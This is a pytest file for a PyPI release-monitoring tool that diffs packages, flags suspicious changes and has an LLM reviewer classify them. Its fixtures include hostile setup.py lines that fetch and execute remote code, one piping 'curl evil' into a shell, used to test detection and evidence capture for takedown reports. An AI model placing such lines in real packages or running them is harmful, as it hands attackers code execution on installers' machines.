import importlib.util
import pytest
from pydiffwatch.config import Config, ReviewerConfig
from pydiffwatch import store, orchestrator, reviewer
from pydiffwatch.models import Diff, FileDiff, Hunk, FiredRule, TriageResult, Verdict, ArtifactSet, NewRelease

_HAS_ANTHROPIC = importlib.util.find_spec("anthropic") is not None


def _diff_obj():
    h = Hunk((0, 0), (0, 3), ["import os", "import requests", "exec(requests.get(U).text)"], [])
    return Diff("p", "1.0", False, [FileDiff("setup.py", "modified", [h])], [])


def _triage_obj():
    return TriageResult(80.0, [FiredRule("combo:fetch+exec", 45.0, "setup.py", (1, 3))], True)


def _malicious_verdict(model="claude-sonnet-4-6"):
    return Verdict("p", "1.0", "malicious", 80.0, [], True, confidence=0.95,
                   attack_type="install-hook-rce", reasoning="r", cited_hunk="setup.py:1-3",
                   recommended_action="report-to-pypi", model=model)


def test_escalate_success_persists_verdict_and_marks_reviewed(tmp_path):
    cfg = Config(db_path=tmp_path / "o.sqlite")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1.0", 1, False, "0.9", "sdist")

    class _R:
        def review(self, diff, triage, **kw): return _malicious_verdict()
    orchestrator._review_escalated(cfg, conn, _R(), _diff_obj(), _triage_obj(), rid)

    assert store.get_stage(conn, "p", "1.0") == "reviewed"
    row = conn.execute("SELECT classification, model FROM verdicts WHERE release_id=?", (rid,)).fetchone()
    assert row["classification"] == "malicious" and row["model"] == "claude-sonnet-4-6"


def _artifactset(new_files, prior_files):
    return ArtifactSet("p", "1.1", "1.0", "sdist", new_files, prior_files, {},
                       added_binaries=[], is_new_package=False, maintainer_metadata=None,
                       added_dep_findings=[])


def test_process_fetched_captures_payload_evidence(tmp_path):
    # A flagged code change must leave the actual payload in releases.evidence (self-contained for a
    # PyPI takedown report — survives the package being pulled and re-fetch failing).
    cfg = Config(db_path=tmp_path / "o.sqlite", lock_path=tmp_path / "lk", reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    art = _artifactset({"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                       {"setup.py": b"import os\n"})
    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
    ev = conn.execute("SELECT evidence FROM releases WHERE package='p' AND version='1.1'").fetchone()[0]
    assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev


def test_process_fetched_leaves_evidence_null_when_benign(tmp_path):
    cfg = Config(db_path=tmp_path / "o.sqlite", lock_path=tmp_path / "lk", reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    art = _artifactset({"util.py": b"x = 1\ny = 2\n"}, {"util.py": b"x = 1\n"})
    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
    ev = conn.execute("SELECT evidence FROM releases WHERE package='p' AND version='1.1'").fetchone()[0]
    assert ev is None


def test_build_reviewer_none_when_disabled():
    assert orchestrator._build_reviewer(Config(reviewer_enabled=False)) is None


def test_build_reviewer_local_needs_no_api_key():
    # Default backend is local Qwen — a reviewer is built with no ANTHROPIC_API_KEY (conftest strips it).
    rvw = orchestrator._build_reviewer(Config())
    assert isinstance(rvw, reviewer.Reviewer)
    assert rvw.backend.primary_model == "qwen-singleshot"


def test_build_reviewer_anthropic_requires_key():
    # no key -> heuristic, returns None BEFORE constructing the SDK backend (so no anthropic import).
    cfg = Config(reviewer=ReviewerConfig(provider="anthropic", model="claude-sonnet-4-6"))
    assert orchestrator._build_reviewer(cfg) is None


@pytest.mark.skipif(not _HAS_ANTHROPIC, reason="optional 'anthropic' extra not installed")
def test_build_reviewer_anthropic_builds_with_key(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    cfg = Config(reviewer=ReviewerConfig(provider="anthropic", model="claude-sonnet-4-6"))
    rvw = orchestrator._build_reviewer(cfg)
    assert isinstance(rvw, reviewer.Reviewer)
    assert rvw.backend.primary_model == "claude-sonnet-4-6"


def test_llm_down_falls_back_to_heuristic_and_marks_review_failed(tmp_path):
    cfg = Config(db_path=tmp_path / "o.sqlite")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1.0", 1, False, "0.9", "sdist")

    class _R:
        def review(self, diff, triage, **kw): raise reviewer.ReviewUnavailable("down")
    orchestrator._review_escalated(cfg, conn, _R(), _diff_obj(), _triage_obj(), rid)

    assert store.get_stage(conn, "p", "1.0") == "review_failed"        # non-terminal -> retried next tick
    alert = conn.execute("SELECT classification FROM alerts WHERE release_id=?", (rid,)).fetchone()
    assert alert["classification"] == "suspicious-heuristic"           # signal not dropped
